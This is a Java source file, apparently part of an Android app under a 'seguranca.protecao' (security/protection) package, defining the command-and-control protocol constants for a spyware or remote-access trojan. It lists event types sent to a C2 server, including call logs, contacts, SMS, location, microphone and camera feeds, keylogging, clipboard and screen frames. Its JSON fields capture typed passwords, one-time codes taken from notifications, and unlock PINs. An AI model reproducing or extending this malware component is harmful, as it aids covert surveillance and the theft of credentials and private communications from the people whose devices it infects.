package com.seguranca.protecao.core;

/**
 * Protocol — all C2 event type strings and JSON key constants
 * used across the ported feature modules.
 */
public final class Protocol {

    private Protocol() {}

    // ── Event types (emitted to C2) ─────────────────────────────────────────
    public static final String CALLS         = "calls";
    public static final String CONTACTS      = "contacts";
    public static final String SMS           = "sms";
    public static final String LOCATION      = "location";
    public static final String MIC           = "mic";
    public static final String CAMERA        = "camera";
    public static final String KEYLOG        = "keylog";
    public static final String NOTIFICATION  = "notification";
    public static final String UNLOCK        = "unlock";
    public static final String ACCOUNTS      = "accounts";
    public static final String FILES         = "file";
    public static final String CLIPBOARD     = "clipboard";
    public static final String SCREEN        = "screen_frame";
    public static final String DEVICE_INFO   = "device_info";

    // ── JSON keys ────────────────────────────────────────────────────────────
    public static final String KEY_TYPE         = "type";
    public static final String KEY_CMD_ID       = "cmd_id";
    public static final String KEY_SUCCESS      = "success";
    public static final String KEY_ERROR        = "error";
    public static final String KEY_MESSAGE      = "message";
    public static final String KEY_DATA         = "data";
    public static final String KEY_TOTAL        = "total";

    // Calls
    public static final String KEY_CALLS_LIST   = "calls";
    public static final String KEY_CALL_ID      = "id";
    public static final String KEY_PHONE_NO     = "number";
    public static final String KEY_NAME         = "name";
    public static final String KEY_DURATION     = "duration";
    public static final String KEY_DATE         = "date";
    public static final String KEY_TYPE_CALL    = "type";

    // Contacts
    public static final String KEY_CONTACTS_LIST = "contacts";
    public static final String KEY_CONTACT_ID    = "id";
    public static final String KEY_CONTACT_PHONE = "phone";
    public static final String KEY_CONTACT_EMAIL = "email";

    // SMS
    public static final String KEY_SMS_LIST      = "sms";
    public static final String KEY_SMS_ID        = "id";
    public static final String KEY_SMS_ADDRESS   = "address";
    public static final String KEY_SMS_BODY      = "body";
    public static final String KEY_SMS_DATE      = "date";
    public static final String KEY_SMS_TYPE      = "type";
    public static final String KEY_SMS_READ      = "read";

    // Location
    public static final String KEY_LAT           = "lat";
    public static final String KEY_LNG           = "lng";
    public static final String KEY_ACCURACY      = "accuracy";
    public static final String KEY_ALTITUDE      = "altitude";
    public static final String KEY_SPEED         = "speed";
    public static final String KEY_PROVIDER      = "provider";
    public static final String KEY_ADDRESS       = "address";

    // Keylog
    public static final String KEY_APP           = "app";
    public static final String KEY_PKG           = "pkg";
    public static final String KEY_TEXT          = "text";
    public static final String KEY_TIMESTAMP     = "ts";
    public static final String KEY_EVENT_TYPE    = "event_type";
    public static final String KEY_IS_PASSWORD   = "is_password";

    // Notification
    public static final String KEY_TITLE         = "title";
    public static final String KEY_BODY          = "body";
    public static final String KEY_PACKAGE       = "package";
    public static final String KEY_IS_OTP        = "is_otp";
    public static final String KEY_OTP_CODE      = "otp_code";

    // Unlock
    public static final String KEY_STATUS        = "status";
    public static final String KEY_PIN           = "pin";

    // Mic / Camera
    public static final String KEY_CHUNK         = "chunk";
    public static final String KEY_FORMAT        = "format";
    public static final String KEY_SAMPLE_RATE   = "sample_rate";
    public static final String KEY_FACING        = "facing";
    public static final String KEY_FRAME         = "frame";
}
